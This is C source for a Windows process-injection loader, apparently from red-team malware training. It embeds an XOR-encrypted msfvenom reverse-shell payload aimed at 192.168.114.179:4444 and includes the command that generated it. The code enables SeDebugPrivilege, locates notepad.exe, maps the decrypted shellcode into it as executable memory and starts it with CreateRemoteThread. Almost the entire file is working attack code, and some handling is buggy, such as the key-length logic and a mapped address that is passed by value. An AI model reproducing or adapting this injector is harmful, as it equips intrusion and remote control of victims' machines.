#include "windows.h"
#include <stdio.h>
#include <string.h>
#include "winternl.h"


LPVOID addr = NULL;
HANDLE timer = NULL;
HANDLE queue = NULL;
HANDLE gDoneEvent = NULL;

//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.114.179 LPORT=4444 exitfunc=thread --encrypt xor --encrypt-key "password" -o reverse_4444_x64_xor.bin
unsigned char data[] =
"\x8e\x31\xf9\x81\x9e\xdf\xb0\x61\x73\x73\x36\x3e\x33\x34\x20"
"\x28\x2c\x2d\x5f\xe5\x15\x29\xf8\x21\x17\x27\xf9\x36\x6a\x31"
"\xf1\x37\x4e\x7f\xfb\x13\x23\x3b\x78\xd8\x38\x2e\x3f\x48\xb3"
"\x2d\x5f\xf7\xdc\x5d\x12\x0f\x75\x43\x52\x25\xb3\xb0\x77\x24"
"\x6f\xf6\x92\x8c\x21\x32\x26\x27\xf9\x36\x52\xf2\x38\x59\x26"
"\x36\xa0\xea\xf3\xfb\x77\x6f\x72\x2c\xf7\xb9\x0e\x02\x26\x36"
"\xa0\x31\xf8\x3b\x6f\x2b\xf9\x24\x52\x30\x7b\xb5\x8d\x61\x38"
"\x9e\xba\x32\xfc\x5b\xfa\x2c\x73\xaf\x37\x54\xa7\x7f\x41\xa1"
"\xdf\x32\xb6\xa6\x7f\x25\x73\xb8\x42\x85\x1b\xc6\x3c\x62\x3f"
"\x57\x7f\x2a\x4b\xb5\x07\xa1\x22\x21\xe5\x77\x54\x28\x72\xa3"
"\x11\x2e\xf9\x68\x3a\x3d\xf1\x25\x72\x7e\x71\xb1\x32\xf8\x73"
"\xe7\x3a\x65\xa2\x38\x22\x24\x36\x69\x29\x3b\x32\x2b\x36\x36"
"\x33\x3e\x3a\xfa\x96\x45\x2f\x65\x8f\x81\x2b\x32\x2e\x35\x3a"
"\xef\x60\x90\x2d\x9a\x91\xc8\x2d\x28\xcd\x04\x04\x5d\x2d\x57"
"\x40\x79\x7a\x24\x38\x7e\xf9\x87\x3b\xf2\x9b\xcf\x73\x64\x72"
"\x30\xf3\x80\x27\x8b\x72\x61\x62\x2f\xb7\xc7\x00\xd7\x33\x2d"
"\x33\xec\x8a\x7b\xf9\x90\x32\xc9\x3b\x18\x54\x63\x8d\xac\x36"
"\xec\x84\x5f\x71\x60\x73\x73\x2e\x2e\xc8\x4d\xf2\x12\x7a\x9a"
"\xbb\x67\x20\x2c\x42\xba\x3a\x5e\xb2\x2c\x8d\xb9\x32\xec\xac"
"\x7f\x8f\xa1\x3b\xfa\xb6\x2e\xc8\x8e\x7d\xa6\x9a\x9a\xbb\x7f"
"\xf9\xa6\x19\x63\x36\x37\x3e\xed\x90\x31\xf3\x9c\x2f\x8d\xe9"
"\xc4\x07\x12\x88\xba\x3a\xe5\xb6\x39\x78\x65\x6e\x7e\xc8\x02"
"\x1e\x17\x77\x6f\x72\x64\x72\x38\x2a\x24\x3e\x7f\xf9\x83\x24"
"\x24\x20\x22\x43\xa4\x18\x74\x23\x24\x3e\xd5\x8c\x07\xb4\x37"
"\x53\x3b\x73\x65\x3a\xf4\x3e\x41\x76\xf1\x70\x09\x3b\xfa\x91"
"\x39\x22\x25\x22\x38\x2a\x24\x3e\x7e\x8f\xa1\x32\x23\x3e\x90"
"\xba\x29\xfb\xb8\x36\xec\xaf\x76\xca\x18\xbf\x4c\xf1\x90\xa7"
"\x2c\x43\xab\x32\x9a\xa4\xbc\x7e\x20\xc9\x7b\xf0\x72\x12\x9b"
"\xa7\xc2\x9a\x78\x44\x3d\x31\xdb\xd5\xe6\xca\xf2\x8d\xb1\x3a"
"\xfa\xbe\x4d\x52\x31\x0c\x6b\xf3\x88\x97\x1a\x77\xdf\x35\x6a"
"\x08\x0a\x04\x37\x29\x20\xfa\xa9\x88\xba";

char key[] = "password";
size_t key_size = sizeof(key);

void* shellcode_pointer = NULL;

// Function pointer
typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
    );

// credit: Sektor7 RTO Malware Essential Course 
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int EnableTokenPrivilege(LPTSTR lpszPrivilege)
{
    printf("[*] Enabling: %s\n", lpszPrivilege);

    TOKEN_PRIVILEGES tp;
    int status = 0;
    HANDLE hToken = NULL;
    DWORD dwSize;

    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken) && LookupPrivilegeValue(NULL, lpszPrivilege, &tp.Privileges[0].Luid))
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, &dwSize)) {
            printf("   |-> Enabled: %s\n", lpszPrivilege);
            status = 1;
        }
        else {
            printf("[!] Failed to enable %s: %d\n", lpszPrivilege, GetLastError());
        }
    }
    CloseHandle(hToken);
    printf("\n");
    return status;
}

BOOL NtGetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

    fnNtQuerySystemInformation   pNtQuerySystemInformation = NULL;
    ULONG                        uReturnLen1 = NULL,
        uReturnLen2 = NULL;
    PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
    NTSTATUS                     STATUS = NULL;
    PVOID                        pValueToFree = NULL;

    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
    if (pNtQuerySystemInformation == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
    pValueToFree = SystemProcInfo;

    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    if (STATUS != 0x0) {
        printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    while (TRUE) {

        // Check the process's name size
        // Comparing the enumerated process name to the intended target process
        if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {

            // Opening a handle to the target process, saving it, and then breaking
            *pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
            *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
            break;
        }

        // If NextEntryOffset is 0, we reached the end of the array
        if (!SystemProcInfo->NextEntryOffset)
            break;

        // Move to the next element in the array
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }

    // Free using the initial address
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // Check if we successfully got the target process handle
    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
        return TRUE;
}

BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL        bSTATE = TRUE;
    HANDLE      hFile = NULL;
    PVOID       pMapLocalAddress = NULL,
    pMapRemoteAddress = NULL;

    // Create a file mapping handle with RWX memory permissions
    // This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call
    hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Maps the view of the payload to the memory
    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
    if (pMapLocalAddress == NULL) {
        printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Copying the payload to the mapped memory
    memcpy(pMapLocalAddress, pPayload, sPayloadSize);

    // Maps the payload to a new remote buffer in the target process
    pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (pMapRemoteAddress == NULL) {
        printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    

    printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
    *ppAddress = pMapRemoteAddress;
    if (hFile)
        CloseHandle(hFile);
    return TRUE;
}

int main()
{
    LPCWSTR procName = L"notepad.exe";
    DWORD pid = NULL;
    HANDLE hProcess;
    HANDLE hThread;

    EnableTokenPrivilege("SeDebugPrivilege");

    printf("[*] Process enum...\n");
    if (!NtGetRemoteProcessHandle(procName, &pid, &hProcess))
    {
        printf("[!] NtQuerySystemInformation Failed\n");
    }
    printf("[+] PID: %d\n", pid);

    printf("[*] Payload decryption...");
    XOR((char*)data, sizeof(data), key, key_size + 1);

    printf("[+] Memory mapping...");
    PVOID pMap = NULL;
    RemoteMapInject(hProcess, &data, sizeof(data), pMap);
    hThread = CreateRemoteThread(hProcess, NULL, 0, pMap, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);   
                return 0;
        }

}
